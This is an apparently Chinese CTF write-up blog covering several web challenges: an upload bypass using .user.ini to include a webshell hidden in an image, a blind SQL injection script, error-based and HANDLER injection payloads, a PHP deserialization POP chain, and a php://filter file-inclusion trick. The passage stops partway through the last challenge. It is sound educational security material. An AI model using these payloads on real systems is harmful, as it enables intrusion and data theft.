<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Your dir uploads/<span class="hljs-number">9987</span>df285bb375eda68448315c5656e5<br>Your files :<br><span class="hljs-function"><span class="hljs-title">array</span><span class="hljs-params">(<span class="hljs-number">4</span>)</span></span> &#123; <span class="hljs-selector-attr">[0]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;.&quot;</span> <span class="hljs-selector-attr">[1]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;..&quot;</span> <span class="hljs-selector-attr">[2]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;index.php&quot;</span> <span class="hljs-selector-attr">[3]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;php2.jpg&quot;</span> &#125;<br></code></pre></td></tr></table></figure>
<p>那目录就是<br>&#x2F;uploads&#x2F;9987df285bb375eda68448315c5656e5&#x2F;php2.jpg<br>蚂蚁又是连不上，但是这次是nginx服务器啊，<br>那可能就是user.ini文件了<br>提交：  </p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">GIF89a<br>auto_prepend_file <span class="hljs-operator">=</span> php2.jpg<br></code></pre></td></tr></table></figure>
<p>回显：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Your dir uploads/<span class="hljs-number">9987</span>df285bb375eda68448315c5656e5<br>Your files :<br><span class="hljs-function"><span class="hljs-title">array</span><span class="hljs-params">(<span class="hljs-number">5</span>)</span></span> &#123; <span class="hljs-selector-attr">[0]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;.&quot;</span> <span class="hljs-selector-attr">[1]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;..&quot;</span> <span class="hljs-selector-attr">[2]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;.user.ini&quot;</span> <span class="hljs-selector-attr">[3]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;index.php&quot;</span> <span class="hljs-selector-attr">[4]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;php2.jpg&quot;</span> &#125;<br></code></pre></td></tr></table></figure>
<p>这个.user.ini的大概用法是让目录下所有php文件包含上你指定的文件，看回显我上传的目录上是有一个index.php的，所以能用.user.ini的办法<br>蚂蚁连目录上的index.php即可<br>flag{e8b4a853-b79a-4497-912e-389a9fda03ba}</p>
<h1 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h1><p>应该是sql题</p>
<figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs sml"><span class="hljs-number">1</span><span class="hljs-symbol">&#x27;or</span>(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>);<br><br>回显：<br><span class="hljs-built_in">array</span>(<span class="hljs-number">2</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;1&quot;</span><br>  [<span class="hljs-number">1</span>]=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">7</span>) <span class="hljs-string">&quot;hahahah&quot;</span><br>&#125;<br><br><span class="hljs-built_in">array</span>(<span class="hljs-number">2</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;2&quot;</span><br>  [<span class="hljs-number">1</span>]=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">12</span>) <span class="hljs-string">&quot;miaomiaomiao&quot;</span><br>&#125;<br><br><span class="hljs-built_in">array</span>(<span class="hljs-number">2</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">6</span>) <span class="hljs-string">&quot;114514&quot;</span><br>  [<span class="hljs-number">1</span>]=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;ys&quot;</span><br>&#125;<br><br></code></pre></td></tr></table></figure>
<p>怎么好像做过原题  </p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-meta">#</span><br>回显：<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">preg_match</span>(<span class="hljs-string">&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;</span>,$inject);<br><br><span class="hljs-number">1</span>&#x27;<span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)<span class="hljs-meta">#</span><br>ok<br>这样的话，感觉用sqlmap都行啊  <br>用了sqlmap默认，发现只能检索出数据库名<br>sumeqrq<span class="hljs-comment">@i</span><br><span class="hljs-comment">会不会是@</span>的问题？<br></code></pre></td></tr></table></figure>
<p>算了自己写个脚本吧</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>name=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment"># for d in range(0,100):</span><br><span class="hljs-comment">#     url = &quot;http://708bd9b9-1fc7-485b-8d30-cf4721d3516a.node5.buuoj.cn:81/?inject=1%27and+length%28database%28%29%29%3D&#123;&#125;%23#&quot;.format(d)</span><br><span class="hljs-comment">#     re = requests.get(url)</span><br><span class="hljs-comment">#     print(&quot;testing&quot;,d)</span><br><span class="hljs-comment">#     if &#x27;hahahah&#x27; in re.text:</span><br><span class="hljs-comment">#         print(&quot;数据库名长度为：&quot;,d)</span><br><span class="hljs-comment">#         break</span><br><span class="hljs-keyword">for</span> d1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">11</span>):<br>    <span class="hljs-keyword">for</span> dn <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">137</span>):<br>        time.sleep(<span class="hljs-number">0.07</span>)<br>        url = <span class="hljs-string">&quot;http://708bd9b9-1fc7-485b-8d30-cf4721d3516a.node5.buuoj.cn:81/?inject=1%27and+ascii%28substr%28database%28%29%2C&#123;&#125;%2C1%29%29%3D&#123;&#125;%23#&quot;</span>.<span class="hljs-built_in">format</span>(d1,dn)<br>        re = requests.get(url)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;testing&quot;</span>,d1,<span class="hljs-built_in">chr</span>(dn),name)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;hahahah&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>            name=name+<span class="hljs-built_in">chr</span>(dn)<br>            <span class="hljs-built_in">print</span>(name)<br></code></pre></td></tr></table></figure>
<p>跑出来是 supersqli<br>但是无法用select和where，也许可以试试预编译？<br>1’;prepare hack from concat(‘sele’,’ct’,’*‘);execute hack;@<br>prepare也过滤了  </p>
<figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-number">1</span>&#x27;<span class="hljs-variable">and</span> <span class="hljs-title function_">extractvalue</span>(<span class="hljs-number">1</span>,<span class="hljs-title function_">concat</span>(&#x27;<span class="hljs-operator">!</span>&#x27;,<span class="hljs-title function_">database</span>()))#<br><span class="hljs-comment">//error 1105 : XPATH syntax error: &#x27;!supersqli&#x27;</span><br><br><span class="hljs-number">1</span>&#x27;<span class="hljs-variable">and</span> <span class="hljs-title function_">extractvalue</span>(<span class="hljs-number">1</span>,<span class="hljs-title function_">concat</span>(&#x27;<span class="hljs-operator">!</span>&#x27;,<span class="hljs-variable">show</span> <span class="hljs-variable">tables</span> <span class="hljs-variable">name</span>))#<br><br><span class="hljs-number">1</span>&#x27;<span class="hljs-variable">and</span> <span class="hljs-title function_">extractvalue</span>(<span class="hljs-number">1</span>,<span class="hljs-title function_">concat</span>(&#x27;<span class="hljs-operator">!</span>&#x27;,@@<span class="hljs-variable">dir</span>))#<br><br><span class="hljs-number">1</span>&#x27;<span class="hljs-variable">and</span> <span class="hljs-title function_">extractvalue</span>(<span class="hljs-number">1</span>,<span class="hljs-title function_">concat</span>(&#x27;<span class="hljs-operator">!</span>&#x27;,<span class="hljs-title function_">user</span>()))#<br><span class="hljs-comment">//error 1105 : XPATH syntax error: &#x27;!root@localhost&#x27;</span><br><br>想用<span class="hljs-variable">rename</span>也被过滤了；<br><br><span class="hljs-number">1</span>&#x27;;<span class="hljs-variable">show</span> <span class="hljs-variable">databases</span>;#<br><br><span class="hljs-title function_">array</span>(2) &#123;<br>  [<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;1&quot;</span><br>  [<span class="hljs-number">1</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">7</span>) <span class="hljs-string">&quot;hahahah&quot;</span><br>&#125;<br><br><span class="hljs-title function_">array</span>(1) &#123;<br>  [<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">11</span>) <span class="hljs-string">&quot;ctftraining&quot;</span><br>&#125;<br><br><span class="hljs-title function_">array</span>(1) &#123;<br>  [<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">18</span>) <span class="hljs-string">&quot;information_schema&quot;</span><br>&#125;<br><br><span class="hljs-title function_">array</span>(1) &#123;<br>  [<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;mysql&quot;</span><br>&#125;<br><br><span class="hljs-title function_">array</span>(1) &#123;<br>  [<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">18</span>) <span class="hljs-string">&quot;performance_schema&quot;</span><br>&#125;<br><br><span class="hljs-title function_">array</span>(1) &#123;<br>  [<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;supersqli&quot;</span><br>&#125;<br><br><span class="hljs-title function_">array</span>(1) &#123;<br>  [<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;test&quot;</span><br>&#125;<br><br><br><span class="hljs-number">1</span>&#x27;;<span class="hljs-variable">show</span> <span class="hljs-variable">tables</span> <span class="hljs-variable">from</span> supersqli;#<br><br><span class="hljs-title function_">array</span>(2) &#123;<br>  [<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;1&quot;</span><br>  [<span class="hljs-number">1</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">7</span>) <span class="hljs-string">&quot;hahahah&quot;</span><br>&#125;<br><br><span class="hljs-title function_">array</span>(1) &#123;<br>  [<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;FlagHere&quot;</span><br>&#125;<br><br><span class="hljs-title function_">array</span>(1) &#123;<br>  [<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;words&quot;</span><br>&#125;<br><br><span class="hljs-number">1</span>&#x27;;<span class="hljs-variable">show</span> <span class="hljs-variable">colums</span> <span class="hljs-variable">from</span> <span class="hljs-title class_">FlagHere</span>;#<br>不回显<br><br><span class="hljs-number">1</span>&#x27;;<span class="hljs-variable">HANDLER</span> <span class="hljs-title class_">FlagHere</span> <span class="hljs-variable">OPEN</span>;<span class="hljs-variable">HANDLER</span> <span class="hljs-title class_">FlagHere</span> <span class="hljs-variable">READ</span> <span class="hljs-variable">FIRST</span>;<span class="hljs-variable">HANDLER</span> <span class="hljs-title class_">FlagHere</span> <span class="hljs-variable">CLOSE</span>;<br>或者<br><span class="hljs-number">1</span>&#x27;;<span class="hljs-variable">HANDLER</span> <span class="hljs-title class_">FlagHere</span> <span class="hljs-variable">OPEN</span>;<span class="hljs-variable">HANDLER</span> <span class="hljs-title class_">FlagHere</span> <span class="hljs-variable">READ</span> <span class="hljs-variable">FIRST</span>;<br><span class="hljs-comment">//flag&#123;0bc2fe53-291d-4d3d-9a1c-adc6d658396e&#125;</span><br></code></pre></td></tr></table></figure>
<p>不说了，原题是2019网鼎杯 随便注，限制了重命名和预编译解法，但是能用handler，复制粘贴payload即可解。。。</p>
<h1 id="SWPUCTF-2021-新生赛-pop"><a href="#SWPUCTF-2021-新生赛-pop" class="headerlink" title="[SWPUCTF 2021 新生赛]pop"></a>[SWPUCTF 2021 新生赛]pop</h1><p>以前的题，做了好久，看了一眼以前的wp，加上AreUSerialz，以后除了public类还是直接在原来的class里直接赋值的好，不然一直出问题</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;index.php&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w44m</span></span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;w44m&#x27;</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$passwd</span> = <span class="hljs-string">&#x27;08067&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Getflag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd ===<span class="hljs-string">&#x27;08067&#x27;</span>)&#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;admin;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nono&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w22m</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;w00m;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w33m</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w22m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;w22m&#125;();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w22m</span>();<br><span class="hljs-variable">$a</span>-&gt;w00m=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w33m</span>();<br><span class="hljs-variable">$a</span>-&gt;w00m-&gt;w00m=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w44m</span>();<br><span class="hljs-variable">$a</span>-&gt;w00m-&gt;w22m=<span class="hljs-string">&#x27;Getflag&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<h1 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h1><p>拿到题目，可以看到这能提供猫猫和狗狗的图片，随便选一个  </p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">/index.php?<span class="hljs-attribute">category</span>=woofers<br></code></pre></td></tr></table></figure>
<p>fuzz一下  </p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/<span class="hljs-keyword">index</span>.php?category=woofers;ls<br><br><span class="hljs-built_in">Warning</span>: <span class="hljs-keyword">include</span>(woofers;ls.php): failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">open</span> stream: <span class="hljs-keyword">No</span> such file <span class="hljs-keyword">or</span> directory <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">37</span><br><span class="hljs-built_in">Warning</span>: <span class="hljs-keyword">include</span>(): Failed opening <span class="hljs-string">&#x27;woofers;ls.php&#x27;</span> <span class="hljs-keyword">for</span> inclusion (include_path=<span class="hljs-string">&#x27;.:/usr/local/lib/php&#x27;</span>) <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">37</span><br><br>/<span class="hljs-keyword">index</span>.php?category=<span class="hljs-keyword">index</span><br><br>Sorry, we currently <span class="hljs-keyword">only</span> support woofers <span class="hljs-keyword">and</span> meowers.<br><br>/<span class="hljs-keyword">index</span>.php?category=meowers;flag<br><br><span class="hljs-built_in">Warning</span>: <span class="hljs-keyword">include</span>(meowers;flag.php): failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">open</span> stream: <span class="hljs-keyword">No</span> such file <span class="hljs-keyword">or</span> directory <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">37</span><br><br><span class="hljs-built_in">Warning</span>: <span class="hljs-keyword">include</span>(): Failed opening <span class="hljs-string">&#x27;meowers;flag.php&#x27;</span> <span class="hljs-keyword">for</span> inclusion (include_path=<span class="hljs-string">&#x27;.:/usr/local/lib/php&#x27;</span>) <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">37</span><br></code></pre></td></tr></table></figure>
<p>一般这种有include函数的可以试试伪协议,然后刚才就有站点目录了，试一下目录穿越看看flag是否在根目录<br>然后若是没有那个目录会返回：<br>Sorry, we currently only support woofers and meowers.  </p>
<p>然后就是能用<br>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index<br>来返回index文件的base64<br>注意到源码里会自动给它加上.php  </p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/<span class="hljs-keyword">index</span>.php?category=php://<span class="hljs-keyword">filter</span>/convert.base64-encode/resource=<span class="hljs-keyword">index</span>.php<br><br><span class="hljs-built_in">Warning</span>: <span class="hljs-keyword">include</span>(php://<span class="hljs-keyword">filter</span>/convert.base64-encode/resource=<span class="hljs-keyword">index</span>.php.php): failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">open</span> stream: operation failed <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">37</span><br><br><span class="hljs-built_in">Warning</span>: <span class="hljs-keyword">include</span>(): Failed opening <span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=index.php.php&#x27;</span> <span class="hljs-keyword">for</span> inclusion (include_path=<span class="hljs-string">&#x27;.:/usr/local/lib/php&#x27;</span>) <span class="hljs-keyword">in</span> /var/www/html/<span class="hljs-keyword">index</span>.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">37</span><br></code></pre></td></tr></table></figure>
<p>到现在能想到的是想办法目录穿越到根目录下读取flag，  </p>
<p>先是  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/index.php?category=php://filter/convert.base64-encode/resource=index.php<br></code></pre></td></tr></table></figure>
<p>拿到源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;html&gt;<br>  &lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> content=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;<br>    &lt;meta name=<span class="hljs-string">&quot;description&quot;</span> content=<span class="hljs-string">&quot;Images that spark joy&quot;</span>&gt;<br>    &lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0, minimum-scale=1.0&quot;</span>&gt;<br>    &lt;title&gt;Had a bad day?&lt;/title&gt;<br>    &lt;link rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;css/material.min.css&quot;</span>&gt;<br>    &lt;link rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;css/style.css&quot;</span>&gt;<br>  &lt;/head&gt;<br>  &lt;body&gt;<br>    &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">page</span>-<span class="hljs-title">layout</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">layout</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">layout</span>--<span class="hljs-title">fixed</span>-<span class="hljs-title">header</span> <span class="hljs-title">mdl</span>-<span class="hljs-title">js</span>-<span class="hljs-title">layout</span> <span class="hljs-title">mdl</span>-<span 